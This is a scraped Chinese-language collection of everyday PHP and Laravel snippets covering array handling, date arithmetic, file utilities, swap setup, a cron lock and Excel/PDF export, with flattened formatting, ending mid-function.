运算就行了例子：如果我选择了篮球 足球 乒乓球 则数据库存的是所有之和 14 在编辑的时候只需要从数据库里的 14 和选项做与 &amp; 运算 大于 0 说明选择了 小于 0 则说明没有选择 $res = 14 &amp; $pingpong; 输出 8 var_dump ($res); https://learnku.com/articles/31874 Composer 安装插件swap 内存不足1234567891011121314151617181920https://learnku.com/laravel/t/27985/bin/dd if=/dev/zero of=/var/swap.1 bs=1M count=2048 /sbin/mkswap /var/swap.1 /sbin/swapon /var/swap.1 free -m mkdir -p /var/_swap_ cd /var/_swap_ # Here, 1M * 2000 ~= 2GB of swap memory dd if=/dev/zero of=swapfile bs=1M count=2000 mkswap swapfile swapon swapfile chmod 600 swapfile echo "/var/_swap_/swapfile none swap sw 0 0" &gt;&gt; /etc/fstab cat /proc/meminfo free -m crc32 检错数据123456789101112131415161718$checksum = crc32("The quick brown fox jumped over the lazy dog.");printf("%u\n", $checksum);//32位和64位支持function crcKw($num)&#123; $crc = crc32($num); if($crc &amp; 0x80000000)&#123; $crc ^= 0xffffffff; $crc += 1; $crc = -$crc; &#125; return $crc; &#125; var_export(crcKw($checksum));2191738434512553366 下载带有换行符的文件内容123456789$lists='tFwdQlk3Xs,mSL6m9P19Y,2sF2r7MxBh'; //要用双引号 $string=implode("\r\n\r\n",explode(',',$lists) ) ; $filename='test.txt'; header("Content-Transfer-Encoding: binary"); header('Content-disposition: attachment; filename='.$filename); echo $string; 两个字符串的相似度123456789101112131415161718192021222324252627282930313233343536373839404142// 输入拼写错误的单词$input = 'carrrot';// 要检查的单词数组$words = array('apple','pineapple','banana','orange', 'radish','carrot','pea','bean','potato');// 目前没有找到最短距离$shortest = -1;// 遍历单词来找到最接近的foreach ($words as $word) &#123; // 计算输入单词与当前单词的距离 $lev = levenshtein($input, $word); // 检查完全的匹配 if ($lev == 0) &#123; // 最接近的单词是这个（完全匹配） $closest = $word; $shortest = 0; // 退出循环；我们已经找到一个完全的匹配 break; &#125; // 如果此次距离比上次找到的要短 // 或者还没找到接近的单词 if ($lev &lt;= $shortest || $shortest &lt; 0) &#123; // 设置最接近的匹配以及它的最短距离https://jc91715.top/code-script/4 $closest = $word; $shortest = $lev; &#125;&#125;echo "Input word: $input\n";if ($shortest == 0) &#123; echo "Exact match found: $closest\n";&#125; else &#123; echo "Did you mean: $closest?\n";&#125; 两个文件是否相同123456789101112131415161718192021222324252627282930313233343536373839define('READ_LEN', 4096);if(files_identical('file1.txt', 'file2.txt')) echo 'files identical';else echo 'files not identical';// pass two file names// returns TRUE if files are the same, FALSE otherwisefunction files_identical($fn1, $fn2) &#123; if(filetype($fn1) !== filetype($fn2)) return FALSE; if(filesize($fn1) !== filesize($fn2)) return FALSE; if(!$fp1 = fopen($fn1, 'rb')) return FALSE; if(!$fp2 = fopen($fn2, 'rb')) &#123; fclose($fp1); return FALSE; &#125; $same = TRUE; while (!feof($fp1) and !feof($fp2)) if(fread($fp1, READ_LEN) !== fread($fp2, READ_LEN)) &#123; $same = FALSE; break; &#125; if(feof($fp1) !== feof($fp2)) $same = FALSE; fclose($fp1); fclose($fp2); return $same;&#125; 大转盘红包概率1234567891011121314151617181920212223242526272829function getPrize($prizes) &#123; $result=[]; $weights = array_sum(array_column($prizes,'w')); foreach ($prizes as $k =&gt; $prize) &#123; $randNum = mt_rand(1, $weights); if ($randNum &lt;= $prize['w']) &#123; $result = $prize; break; &#125; else &#123; $weights -= $prize['w']; &#125; &#125; return $result; &#125; $prizes = array( array('id'=&gt;1,'name'=&gt;'特等奖','w'=&gt;1), array('id'=&gt;2,'name'=&gt;'一等奖','w'=&gt;5), array('id'=&gt;3,'name'=&gt;'二等奖','w'=&gt;10), array('id'=&gt;4,'name'=&gt;'三等奖','w'=&gt;12), array('id'=&gt;5,'name'=&gt;'四等奖','w'=&gt;22), array('id'=&gt;6,'name'=&gt;'没中奖','w'=&gt;50)); https://jc91715.top/code-script/14var_export(getPrize($prizes));array ( 'id' =&gt; 4, 'name' =&gt; '三等奖', 'w' =&gt; 12,) 实现http协议1234567891011121314151617181920212223242526272829303132使用 stream_socket_server 监听tcp连接，并实现http协议。 访问http://jc91715.top:8080体验$socket = stream_socket_server("tcp://0.0.0.0:8080", $errno, $errstr);if (!$socket) &#123; echo "$errstr ($errno)&lt;br /&gt;\n";&#125; else &#123; echo '正在监听';https://jc91715.top/code-script/16 while ($conn = stream_socket_accept($socket)) &#123; //$sock_data = fread($conn, 1024); //echo $sock_data; $res="HTTP/1.1 200 ok\r\nAccept-Ranges: bytes\r\ncontent-type: text/html; charset=utf-8\r\n\r\nThe local time is ".date('Y-m-d H:i:s')."\r\n"; fwrite($conn,$res); fclose($conn); &#125; &#125;使用 stream_socket_client 创建一个http 客户端。刷新或者访问 http://jc91715.top:8080/ 测试$fp = stream_socket_client("tcp://127.0.0.1:8080", $errno, $errstr, 30);if (!$fp) &#123; echo "$errstr ($errno)&lt;br /&gt;\n";&#125; else &#123; fwrite($fp, "GET / HTTP/1.0\r\nHost: www.example.com\r\nAccept: */*\r\n\r\n"); while (!feof($fp)) &#123; echo fgets($fp, 1024); &#125; fclose($fp);&#125;HTTP/1.1 200 okAccept-Ranges: bytescontent-type: text/html; charset=utf-8The local time is 2019-08-01 20:24:13 排名算法支持重复排名1234567891011121314151617181920212223242526272829303132333435363738394041$arr = [ [ 'id'=&gt;1, 'score'=&gt;10, ], [ 'id'=&gt;2, 'score'=&gt;30, ], [ 'id'=&gt;3, 'score'=&gt;50, ], [ 'id'=&gt;4, 'score'=&gt;50, ]];array_multisort(array_column($arr,'score'),SORT_ASC,$arr);$results = array_slice($arr, 0, 3, true);$length = count($arr);$resultLength = count($results);//$resultLength 比 $length小说明$arr 的还有元素，否则它们俩就相等了。然后比较key和key+1的值。极限是所有的人都和第三名相同，自行判断是否需要所有人都胜出，来限制 $resultLength 的长度https://jc91715.top/code-script/13while($resultLength&lt;$length &amp;&amp;$results[$resultLength-1]['score']==$arr[$resultLength]['score'])&#123; array_push($results,$arr[$resultLength]); $resultLength = count($results);&#125;$ifWinner = false;$id=1;if(in_array($id,array_column($results,'id')))&#123; $ifWinner = true;&#125;var_export($results);echo '&lt;br&gt;';var_export($ifWinner); new static 和 new self123456789101112131415161718192021class Father &#123; public static function getSelf() &#123; return new self(); &#125; public static function getStatic() &#123; return new static(); &#125;&#125;class Son extends Father &#123;&#125;echo get_class(Son::getSelf()); // Fatherecho get_class(Son::getStatic()); // Sonecho get_class(Father::getSelf()); // Fatherecho get_class(Father::getStatic()); // Fatherself 返回的是 new self 中关键字 new 所在的类中static 会返回执行 new static() 的类，比如 Son 执行 get_class(Son::getStatic()) 返回的是 Son, Father 执行 get_class(Father::getStatic()) 返回的是 Father而在没有继承的情况下，可以认为 new self 和 new static 是返回相同的结果。https://learnku.com/articles/31929 PHP 导出 PDF1234567891011121314151617181920212223242526272829303132333435363738require_once('TCPDF/tcpdf.php'); //实例化 https://github.com/tecnickcom/tcpdf$pdf = new TCPDF('P', 'mm', 'A4', true, 'UTF-8', false); // 设置文档信息 $pdf-&gt;SetCreator('Helloweba'); $pdf-&gt;SetAuthor('zzy'); $pdf-&gt;SetTitle('测试!'); $pdf-&gt;SetSubject('TCPDF Tutorial'); $pdf-&gt;SetKeywords('TCPDF, PDF, PHP'); // 设置页眉和页脚信息 #$pdf-&gt;SetHeaderData('logo.png', 30, '', '',array(0,64,255), array(0,64,128)); $pdf-&gt;setFooterData(array(0,64,0), array(0,64,128)); // 设置页眉和页脚字体 $pdf-&gt;setHeaderFont(Array('stsongstdlight', '', '10')); $pdf-&gt;setFooterFont(Array('helvetica', '', '8')); // 设置默认等宽字体 $pdf-&gt;SetDefaultMonospacedFont('courier'); // 设置间距 $pdf-&gt;SetMargins(15, 27, 15); $pdf-&gt;SetHeaderMargin(5); $pdf-&gt;SetFooterMargin(10); // 设置分页 $pdf-&gt;SetAutoPageBreak(TRUE, 25); // set image scale factor $pdf-&gt;setImageScale(1.25); // set default font subsetting mode $pdf-&gt;setFontSubsetting(true); //设置字体 $pdf-&gt;SetFont('stsongstdlight', '', 14); $pdf-&gt;AddPage(); $pdf-&gt;Write(0,'折线图',4, 0, 'L', true, 0, false, false, 0); $pdf-&gt;Image('example12.png', 10, 40, 200, 80, 'PNG', '', '', true, 150, '', false, false, 1, false, false, false);//输出PDF $pdf-&gt;Output('t.pdf', 'I');redis 本身是单例队列处理的，再多高并发请求都是排队进行。除了 blpop，还有像 setnx,incrby,decrby,lpop,rpop 等命令，这些你都可以高并发或分布式场景下使用。 strtotime 的困惑1234567891011121314151617var_dump(date("Y-m-d", strtotime("-1 month", strtotime("2017-03-31"))));//输出2017-03-03var_dump(date("Y-m-d", strtotime("+1 month", strtotime("2017-08-31"))));//输出2017-10-01var_dump(date("Y-m-d", strtotime("next month", strtotime("2017-01-31"))));//输出2017-03-03var_dump(date("Y-m-d", strtotime("last month", strtotime("2017-03-31"))));//输出2017-03-03只要涉及到大小月的最后一天，都可能会有这个迷惑。var_dump(date("Y-m-d", strtotime("last day of -1 month", strtotime("2017-03-31"))));//输出2017-02-28var_dump(date("Y-m-d", strtotime("first day of +1 month", strtotime("2017-08-31"))));//输出2017-09-01var_dump(date("Y-m-d", strtotime("first day of next month", strtotime("2017-01-31"))));//输出2017-02-01var_dump(date("Y-m-d", strtotime("last day of last month", strtotime("2017-03-31"))));//输出2017-02-28 正则匹配emoji1/[\w\x&#123;4e00&#125;-\x&#123;9fa5&#125;]&#123;2,25&#125;/u 合并一个或多个数组123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211$ar1 = array("color" =&gt; array("favorite" =&gt; "red"), 5);\$ar2 = array(10, "color" =&gt; array("favorite" =&gt; "green", "blue"));\$result = array_merge_recursive($ar1, $ar2); [ "color" =&gt; [ "favorite" =&gt; [ "red", "green", ], 0 =&gt; "blue", ], 0 =&gt; 5, 1 =&gt; 10, ]$array1 = array("a" =&gt; "green", "b" =&gt; "brown", "c" =&gt; "blue", "red");$array2 = array("a" =&gt; "GREEN", "B" =&gt; "brown", "yellow", "red");print_r(array_intersect_uassoc($array1, $array2, "strcasecmp"));带索引检查计算数组的交集，用回调函数比较索引将一个线性数组转换为一个树，或者多维数组 function array_stack (&amp;$a, $p = '@parent', $c = '@children') &#123; $l = $t = array(); foreach ($a AS $key =&gt; $val): if (!$val[$p]) $t[$key] =&amp; $l[$key]; else $l[$val[$p]][$c][$key] =&amp; $l[$key]; $l[$key] = (array)$l[$key] + $val; endforeach; return $a = array('tree' =&gt; $t, 'leaf' =&gt; $l); &#125; $node = array(); $node[1] = array('@parent' =&gt; 0, 'title' =&gt; 'I am node 1.'); $node[2] = array('@parent' =&gt; 1, 'title' =&gt; 'I am node 2.'); $node[3] = array('@parent' =&gt; 2, 'title' =&gt; 'I am node 3.'); $node[4] = array('@parent' =&gt; 1, 'title' =&gt; 'I am node 4.'); $node[5] = array('@parent' =&gt; 4, 'title' =&gt; 'I am node 5.'); print_r(array_stack($node)); [ "tree" =&gt; [ 1 =&gt; &amp;1 [ "@parent" =&gt; 0, "title" =&gt; "I am node 1.", "@children" =&gt; [ 2 =&gt; &amp;2 [ "@parent" =&gt; 1, "title" =&gt; "I am node 2.", "@children" =&gt; [ 3 =&gt; &amp;3 [ "@parent" =&gt; 2, "title" =&gt; "I am node 3.", ], ], ], 4 =&gt; &amp;4 [ "@parent" =&gt; 1, "title" =&gt; "I am node 4.", "@children" =&gt; [ 5 =&gt; &amp;5 [ "@parent" =&gt; 4, "title" =&gt; "I am node 5.", ], ], ], ], ], ], "leaf" =&gt; [ 1 =&gt; &amp;1 [], 2 =&gt; &amp;2 [], 3 =&gt; &amp;3 [], 4 =&gt; &amp;4 [], 5 =&gt; &amp;5 [], ], ] 二维数组分组 function array_group_by($arr, $key) &#123; $grouped = []; foreach ($arr as $value) &#123; $grouped[$value[$key]][] = $value; &#125; if (func_num_args() &gt; 2) &#123; $args = func_get_args(); foreach ($grouped as $key =&gt; $value) &#123; $parms = array_merge([$value], array_slice($args, 2, func_num_args())); $grouped[$key] = call_user_func_array('array_group_by', $parms); &#125; &#125; return $grouped; &#125; 根据日期获取星期 function get_week($date)&#123; //强制转换日期格式 $date_str=date('Y-m-d',strtotime($date)); //封装成数组 $arr=explode("-", $date_str); $year=$arr[0]; //月，输出2位整型，不够2位右对齐 $month=sprintf('%02d',$arr[1]); $day=sprintf('%02d',$arr[2]); //时分秒默认赋值为0； $hour = $minute = $second = 0; //转换成时间戳 $strap = mktime($hour,$minute,$second,$month,$day,$year); //获取数字型星期几 $number_wk=date("w",$strap); //自定义星期数组 $weekArr=array("星期日","星期一","星期二","星期三","星期四","星期五","星期六"); //获取数字对应的星期 return $weekArr[$number_wk]; &#125; 计算 两个时间差 function timediff($begin_time,$end_time) &#123; if($begin_time &lt; $end_time)&#123; $starttime = $begin_time; $endtime = $end_time; &#125;else&#123; $starttime = $end_time; $endtime = $begin_time; &#125; //计算天数 $timediff = $endtime-$starttime; $days = intval($timediff/86400); //计算小时数 $remain = $timediff%86400; $hours = intval($remain/3600); //计算分钟数 $remain = $remain%3600; $mins = intval($remain/60); //计算秒数 $secs = $remain%60; $res = array("day" =&gt; $days,"hour" =&gt; $hours,"min" =&gt; $mins,"sec" =&gt; $secs); return $res; &#125; 递归遍历目录 function my_dir($dir) &#123; $files = array(); $e=mb_detect_encoding($dir,array('GB2312','GBK','UTF-8')); $dir = mb_convert_encoding($dir,'GBK', $e); if(@$handle = opendir($dir)) &#123; //注意这里要加一个@，不然会有warning错误提示：） while(($file = readdir($handle)) !== false) &#123; if($file != ".." &amp;&amp; $file != ".") &#123; //排除根目录； $filename=$dir."/".$file; if(is_dir($filename)) &#123; //如果是子文件夹，就进行递归 $files[$file] =my_dir($filename); &#125; else &#123; $e=mb_detect_encoding($file,array('GB2312','GBK','UTF-8')); $file = mb_convert_encoding($file,'GBK', $e); $files[] = $file; &#125; &#125; &#125; closedir($handle); return $files; &#125; &#125; 读取文本内容 function auto_read($file, $charset='UTF-8') &#123; if (!file_exists($file)) &#123; return false; &#125; else &#123; if(filesize($file) &lt;= 0) &#123; return false; &#125; $list = array('GBK', 'UTF-8', 'UTF-16LE', 'UTF-16BE', 'ISO-8859-1'); $handle = fopen($file,"r"); $str = fread($handle,filesize($file)); foreach ($list as $item) &#123; $tmp = mb_convert_encoding($str, $item, $item); if (md5($tmp) == md5($str)) &#123; return mb_convert_encoding($str, $charset, $item); &#125; &#125; return false; &#125; 文件大小计算 function format_size($size) &#123; $unit = 'B'; if ($size &gt;= 1024) &#123; $size /= 1024; $unit = 'KB'; &#125; if ($size &gt;= 1024) &#123; $size /= 1024; $unit = 'MB'; &#125; if ($size &gt;= 1024) &#123; $size /= 1024; $unit = 'GB'; &#125; if ($size &gt;= 1024) &#123; $size /= 1024; $unit = 'TB'; &#125; return round($size) . $unit; &#125; 中文字符串拆分 function split_cn($arr)&#123; $re=array(); //定义接受字符串的数组 for($i=0;$i&lt;mb_strlen($arr);$i++)&#123; if(mb_substr($arr,$i,1,"utf-8")=='')&#123; continue; &#125; $res[]=mb_substr($arr,$i,1,"utf-8"); //将单个字符存到数组当中 &#125; return $res; &#125;https://learnku.com/articles/31987 存储货币123456789public function setPriceAttribute($value) &#123; $this-&gt;attributes['price] = intval($value * 100);//以分为单位https://learnku.com/articles/31968 &#125; public function getPriceAttribute($value) &#123; return $value / 100; &#125; MySQL Blob 类型12345678910111213141516$filename = 'filename.txt';$headers = [ 'Content-Encoding' =&gt; 'UTF-8', 'Content-Type' =&gt; 'text/html;charset=UTF-8',//application/x-msdownload 'Content-Disposition' =&gt; "attachment; filename=\"$filename\"",];response()-&gt;stream(function () &#123; $handle = fopen('php://output', 'w'); fwrite($handle, 'something contents'); // Close the output stream fclose($handle);&#125;, 200, $headers)-&gt;send();https://learnku.com/laravel/t/32066 中文分割12345678910111213141516171819202122 function split_cn($arr)&#123; $re=array(); //定义接受字符串的数组 for($i=0;$i&lt;mb_strlen($arr);$i++)&#123; if(mb_substr($arr,$i,1,"utf-8")=='')&#123; continue; &#125; $res[]=mb_substr($arr,$i,1,"utf-8"); //将单个字符存到数组当中 &#125; return $res;&#125; preg_split('//u','中文', null, PREG_SPLIT_NO_EMPTY)=&gt; [ "中", "文", ] split_cn('中文') [ "中", "文", ] preg_split('/(?&lt;!^)(?!$)/u', $string ); https://www.php.net/manual/zh/function.mb-split.php 文件大小123456789101112131415161718192021222324252627282930313233function format_size($size)&#123; $unit = 'B'; if ($size &gt;= 1024) &#123; $size /= 1024; $unit = 'KB'; &#125; if ($size &gt;= 1024) &#123; $size /= 1024; $unit = 'MB'; &#125; if ($size &gt;= 1024) &#123; $size /= 1024; $unit = 'GB'; &#125; if ($size &gt;= 1024) &#123; $size /= 1024; $unit = 'TB'; &#125; return round($size) . $unit;&#125;/*** 格式化字节大小* @param number $size 字节数* @param string $delimiter 数字和单位分隔符* @return string 格式化后的带单位的大小 */function get_byte($size, $delimiter = '') &#123;$units = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 5; $i++) $size /= 1024;return round($size, 2) . $delimiter . $units[$i];&#125;https://learnku.com/articles/31985 时间差1234567891011121314151617181920212223function timediff($begin_time,$end_time)&#123; if($begin_time &lt; $end_time)&#123; $starttime = $begin_time; $endtime = $end_time; &#125;else&#123; $starttime = $end_time; $endtime = $begin_time; &#125; //计算天数 $timediff = $endtime-$starttime; $days = intval($timediff/86400); //计算小时数 $remain = $timediff%86400; $hours = intval($remain/3600); //计算分钟数 $remain = $remain%3600; $mins = intval($remain/60); //计算秒数 $secs = $remain%60; $res = array("day" =&gt; $days,"hour" =&gt; $hours,"min" =&gt; $mins,"sec" =&gt; $secs); return $res;&#125; 数组分组1234567891011121314151617function array_group_by($arr, $key)&#123; $grouped = []; foreach ($arr as $value) &#123; $grouped[$value[$key]][] = $value; &#125; if (func_num_args() &gt; 2) &#123; $args = func_get_args(); foreach ($grouped as $key =&gt; $value) &#123; $parms = array_merge([$value], array_slice($args, 2, func_num_args())); $grouped[$key] = call_user_func_array('array_group_by', $parms); &#125; &#125; return $grouped;&#125; 日期获取星期123456789101112function get_week($date)&#123; //强制转换日期格式 $date_str=date('Y-m-d',strtotime($date)); //封装成数组 $arr=explode("-", $date_str); $year=$arr[0]; //月，输出2位整型，不够2位右对齐 $month=sprintf('%02d',$arr[1]); $day=sprintf('%02d',$arr[2]); //时分秒默认赋值为0； $hour = $minute = $second = 0; //转换成时间戳 $strap = mktime($hour,$minute,$second,$month,$day,$year); //获取数字型星期几 $number_wk=date("w",$strap); //自定义星期数组 $weekArr=array("星期日","星期一","星期二","星期三","星期四","星期五","星期六"); //获取数字对应的星期 return $weekArr[$number_wk];&#125; Laravel 距离排序12345678910public function getDistance($lat, $lng)&#123; $distance = "ACOS(SIN(( $lat * 3.1415) / 180 ) *SIN((lat * 3.1415) / 180 ) +COS(( $lat* 3.1415) / 180 ) * COS((lat * 3.1415) / 180 ) *COS(( $lng* 3.1415) / 180 - (lng * 3.1415) / 180 ) ) * 6380"; $list = $this-&gt;model-&gt;select('*')-&gt;addSelect(\DB::raw($distance . ' as distance'))-&gt;orderBy('distance', 'ASC')-&gt;get()-&gt;toArray(); dd($list);&#125;distance 是计算出来的距离单位是公里$model = DB::table('table_name')-&gt;select('');$model-&gt;addSelect(\DB::raw("acos(cos(" . $lat . "*pi()/180)*cos(lat*pi()/180)*cos(" . $lng . "*pi()/180-lng*pi()/180)+sin(" . $lat . "*pi()/180)*sin(lat * pi()/180)) * 6367000 AS distance"))-&gt;orderBy('distance','ASC')-&gt;get();https://learnku.com/articles/32166 二维数组去重123456789public function assoc_unique(&amp;$arr, $key)&#123; $rAr = array(); for($i=0;$i&lt;count($arr);$i++) &#123; if(!isset($rAr[$arr[$i][$key]])) &#123; $rAr[$arr[$i][$key]]=$arr[$i]; &#125; &#125; return array_values($rAr);&#125; 排序12345678910111213141516171819202122function list_sort_by($list,$field, $sortby='asc') &#123; if(is_array($list))&#123; $refer = $resultSet = array(); foreach ($list as $i =&gt; $data) $refer[$i] = &amp;$data[$field]; switch ($sortby) &#123; case 'asc': // 正向排序 asort($refer); break; case 'desc':// 逆向排序 arsort($refer); break; case 'nat': // 自然排序https://learnku.com/articles/32011#1c030d natcasesort($refer); break; &#125; foreach ( $refer as $key=&gt; $val) $resultSet[] = &amp;$list[$key]; return $resultSet; &#125; return false;&#125; 字符串转换成数组123456789function strToArray($string) &#123; $strlen = mb_strlen($string); while ($strlen) &#123; $array[] = mb_substr($string, 0, 1, "utf8"); $string = mb_substr($string, 1, $strlen, "utf8"); $strlen = mb_strlen($string); &#125; return $array;&#125; 创建图片上传目录12345678910111213141516function my_mkdir($Folder)&#123; // 创建图片上传目录和缩略图目录 if(!is_dir($Folder))&#123; $dir = explode('/',$Folder); foreach($dir as $v)&#123; if($v)&#123; $d .= $v . '/'; if(!is_dir($d))&#123; $state = mkdir($d); if(!$state)&#123; die('在创建目录' . $d . '时出错！'); &#125; &#125; &#125; &#125; &#125;&#125; 删除目录123456789101112131415161718192021222324/** * 删除目录及目录下所有文件或删除指定文件 * @param str $path 待删除目录路径 * @param int $delDir 是否删除目录，1或true删除目录，0或false则只删除文件保留目录（包含子目录） * @return bool 返回删除状态 */function del_dir_and_file($path, $delDir = FALSE) &#123; $handle = opendir($path); if ($handle) &#123; while (false !== ( $item = readdir($handle) )) &#123; if ($item != "." &amp;&amp; $item != "..") is_dir("$path/$item") ? del_dir_and_file("$path/$item", $delDir) : unlink("$path/$item"); &#125; closedir($handle); if ($delDir) return rmdir($path); &#125;else &#123; if (file_exists($path)) &#123; return unlink($path); &#125; else &#123; return FALSE; &#125; &#125;&#125; xml 转为 array12345function xmlToArray($xml) &#123; //将XML转为array $array_data = json_decode(json_encode(simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOCDATA)), true); return $array_data;&#125; 递归重组12345678function node_merge($attr, $arr) &#123; foreach($attr as $v)&#123; if (is_array($arr))&#123; $v['access'] = in_array($v['id'],$arr) ? 1: 0; &#125; &#125; return $attr;&#125; 获取文件信息1234567891011121314function get_file_info($filepath='', $key='')&#123; //打开文件，r表示以只读方式打开 $handle = fopen($filepath,"r"); //获取文件的统计信息 $fstat = fstat($handle); fclose($handle); $fstat['filename'] = basename($filepath); if(!empty($key))&#123; return $fstat[$key]; &#125;else&#123; return $fstat; &#125;&#125; 非递归实现查询该目录下所有文件12345678910111213141516171819202122232425262728293031323334353637383940/** * PHP 非递归实现查询该目录下所有文件 * @param unknown $dir * @return multitype:|multitype:string */function scanfiles($dir) &#123; if (! is_dir ( $dir )) return array (); // 兼容各操作系统 $dir = rtrim ( str_replace ( '\\', '/', $dir ), '/' ) . '/'; // 栈，默认值为传入的目录 $dirs = array ( $dir ); // 放置所有文件的容器 $rt = array (); do &#123; // 弹栈 $dir = array_pop ( $dirs ); // 扫描该目录 $tmp = scandir ( $dir ); foreach ( $tmp as $f ) &#123; // 过滤. .. if ($f == '.' || $f == '..') continue; // 组合当前绝对路径 $path = $dir . $f; // 如果是目录，压栈。 if (is_dir ( $path )) &#123; array_push ( $dirs, $path . '/' ); &#125; else if (is_file ( $path )) &#123; // 如果是文件，放入容器中 $rt [] = $path; &#125; &#125; &#125; while ( $dirs ); // 直到栈中没有目录 return $rt;&#125; 单例cron123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960同时消费队列的进程不得超过1个public function index() &#123; $pid = getmypid(); $pidFile = self::PID_FILE; if (file_exists($pidFile)) &#123; $pid = file_get_contents($pidFile); $output = shell_exec("ps aux | grep -v grep | grep &#123;$pid&#125; | grep php | grep index_prod | grep balabala"); if (!empty($output)) &#123; exit(0); &#125; &#125; file_put_contents($pidFile, $pid); for ($i = 0; $i &lt; 100000; $i++) &#123; // bla bla &#125; unlink($pidFile); &#125; public function index() &#123; if ($this-&gt;redis-&gt;exists(self::PID_KEY)) &#123; retry_loop:$pid = $this-&gt;redis-&gt;get(self::PID_KEY); $output = shell_exec("ps aux | grep -v grep | grep &#123;$pid&#125; | grep php | grep index_prod | grep AsyncBatchMemberImport"); if (!empty($output)) &#123; exit(0); &#125; else &#123; $this-&gt;redis-&gt;del(self::PID_KEY); &#125; &#125; $ret = $this-&gt;redis-&gt;set(self::PID_KEY, getmypid(), array('nx')); if (false === $ret) &#123; goto retry_loop; &#125; for ($i = 0; $i &lt; 100000; $i++) &#123; // bla bla &#125; $this-&gt;redis-&gt;del(self::PID_KEY); &#125; php.ini中disable_functions包含了这个函数 getmypid返回的结果是null php script.php `cat /dev/urandom | head -n 10 | md5sum | head -c 10`cat /dev/urandom | head -n 10 | md5sum | head -c 10 返回随机数 https://blog.jiaojie.site/_posts/2017/12/13/another-cron-pid/ public function index($uniqueId = 0) &#123; $this-&gt;uniqueId = $uniqueId; if ($this-&gt;redis-&gt;exists(self::PID_KEY)) &#123; $pid = $this-&gt;redis-&gt;get(self::PID_KEY); log_warning('ERP_IMPORT_ASYNC_INFO', "UniqueId &#123;$pid&#125; Still RUNNING"); exit(0); &#125; $ret = $this-&gt;redis-&gt;set(self::PID_KEY, $uniqueId, array('nx')); if (false === $ret) &#123; log_warning('ERP_IMPORT_ASYNC_INFO', "Set PID FAILED, WILL RETRY, Current PID " . $uniqueId); exit(0); &#125; $this-&gt;redis-&gt;expire(self::PID_KEY, 360); for ($i = 0; $i &lt; 1000; $i++) &#123; // bla bla &#125; $this-&gt;redis-&gt;del(self::PID_KEY); &#125; 每三位加个逗号分割12345678910$input = "12345678";$regex = "#^(?&lt;first&gt;([0-9]&#123;1,3&#125;)??)(?&lt;others&gt;([0-9]&#123;3&#125;)*)$#";$callback = function($match) &#123; $arr = str_split($match["others"], 3); return empty($match["first"]) ? (implode(",", $arr)) : ("" . $match["first"] . "," . implode(",", $arr));&#125;;$output = preg_replace_callback($regex, $callback, $input);//12,345,678 Fibonacci数列12345678910111213141516171819202122232425262728293031323334$fib = function($n)use(&amp;$fib)&#123; if($n == 0 || $n == 1) return 1; return $fib($n - 1) + $fib($n - 2);&#125;;echo $fib(10);php的匿名函数中，如果use一个基本数据类型（非对象）的时候，传递的是当时此数据的快照；而use一个对象的时候，与函数参数中传递该对象相同，都是引用https://blog.jiaojie.site/_posts/2017/07/25/the-word-use-in-php-closure/$aaa = 111;$func = function() use($aaa)&#123; print $aaa; &#125;;$aaa = 222;$func(); // Outputs "111"$aaa = 111;$func = function() use(&amp;$aaa)&#123; print $aaa; &#125;;$aaa = 222;$func(); // Outputs "222"class Foo&#123; public $foo = 'default';&#125;$foo = new Foo;$func = function() use ($foo) &#123; echo $foo-&gt;foo . "\n";&#125;;$foo-&gt;foo = 'changable';$func();// 输出 "changable" 验证日期非HTML字符1234date('Y-m-d',strtotime('2019-09-09'))=='2019-09-09'if ($content == strip_tags($content))&#123;//没有HTML标签 return true; &#125; ip限制123456789101112function ipLimit()&#123; $meip = ip2long($_SERVER['REMOTE_ADDR']); $ip_lib= array('10.0.0.0-10.255.255.255'); for($i=0;$i&lt;count($ip_lib);$i++)&#123; list($sip,$eip) = explode('-',$ip_lib[$i]); $sip = ip2long(trim($sip)); $eip = ip2long(trim($eip)); if($meip &lt;= $sip || $meip &gt;= $eip)&#123; header("Location:http://sina.com.cn/"); &#125; &#125;&#125; PHP 导出 Excel123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123/**\* 导出Excel文件 速度慢* @param $fileName 导出的文件名* @param $headArr 数据头* @param $data 导出数据*/function getExcel($fileName,$headArr,$data)&#123; //设置PHP最大单线程的独立内存使用量 ini_set('memory_limit','1024M'); //程序超时设置设为不限时 ini_set('max_execution_time ','0'); //导入PHPExcel类库，因为PHPExcel没有用命名空间，所以使用vendor导入 vendor("PHPExcel.PHPExcel.IOFactory"); vendor("Excel.PHPExcel"); vendor("Excel.PHPExcel.Writer.Excel5"); vendor("Excel.PHPExcel.IOFactory.php"); //对数据进行检验 if(empty($data) || !is_array($data))&#123; die("data must be a array"); &#125; //检查文件名 if(empty($fileName))&#123; exit; &#125; $date = date("Y_m_d",time()); $fileName .= "_&#123;$date&#125;.xls"; //创建PHPExcel对象 $objPHPExcel = new \PHPExcel(); //设置表头 $key = ord("A"); foreach($headArr as $hkey =&gt; $v)&#123; $colum = chr($key); $objPHPExcel-&gt;setActiveSheetIndex(0) -&gt;setCellValue($colum.'1', $v); $key += 1; unset($headArr[$hkey]); &#125; $column = 2; $objActSheet = $objPHPExcel-&gt;getActiveSheet(); foreach($data as $key =&gt; $rows)&#123; //行写入 $span = ord("A"); foreach($rows as $keyName=&gt;$value)&#123;// 列写入 $j = chr($span); //设置导出单元格格式为文本，避免身份证号的数据被Excel改写 $objActSheet-&gt;setCellValueExplicit($j.$column, $value); $span++; unset($rows[$keyName]); &#125; $column++; unset($data[$key]); &#125; $fileName = iconv("utf-8", "gb2312", $fileName); //重命名表 // $objPHPExcel-&gt;getActiveSheet()-&gt;setTitle('test'); //设置活动单指数到第一个表,所以Excel打开这是第一个表 $objPHPExcel-&gt;setActiveSheetIndex(0); ob_end_clean(); ob_start(); header('Content-Type: application/vnd.ms-excel');//定义输出的文件类型为excel文件 header("Content-Disposition: attachment;filename=\"$fileName\"");//定义输出的文件名 header('Cache-Control: 